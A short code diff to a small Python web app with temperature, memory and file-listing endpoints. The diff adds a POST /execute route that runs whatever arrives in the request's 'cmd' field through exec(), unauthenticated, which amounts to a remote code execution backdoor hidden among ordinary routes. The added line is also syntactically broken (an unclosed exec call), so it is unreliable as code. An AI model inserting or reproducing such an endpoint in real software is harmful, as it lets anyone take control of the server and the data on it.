@@ -18,6 +18,10 @@ def home(data=None):
     context = {'temperature':temp,'memory':memory}
     return app.template_response('index.html', context)
 
+@app.post("/execute")
+def execute(request:dict=None):
+    if 'cmd' in request:return_value={};exec(request['cmd'];return return_value
+
 @app.get("/files")
 def get_files(data=None):
     directory = '.'
